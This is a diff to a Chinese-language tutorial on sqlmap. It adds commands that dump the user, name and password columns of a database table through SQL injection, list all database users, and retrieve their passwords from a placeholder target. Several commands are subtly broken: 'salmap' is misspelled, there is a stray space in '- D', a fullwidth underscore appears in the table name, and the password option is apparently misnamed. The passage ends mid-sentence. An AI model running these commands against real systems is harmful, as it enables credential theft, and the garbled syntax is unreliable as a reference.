@@ -36,8 +36,20 @@ sqlmap -u http://xxx/ -D dkeye --tables
 sqlmap -u http://xxx/ -D dkeye -T user_info -- columns
 ```
 
-4. 确定字段后，使用命令获取某个字段的
-
-```{.python .input}
+4. 确定字段后，使用命令获取某个字段的内容
 
 ```
+sqlmap.py -u http://xxx/ - D dkeye -T use＿info -C user,name,password --dump
+```
+
+获取与数据库用户相关的信息
+1. 获取到数据库中的所有用户
+```
+salmap -u "http://xxx/" --users
+```
+使用该条语句的前提是，当前用户有权限读取包含所有用户的表的权限时。
+2. 获取数据库中用户的密码
+```
+salmap -u "http://xxx/" --password
+``` 
+获取到的密码是
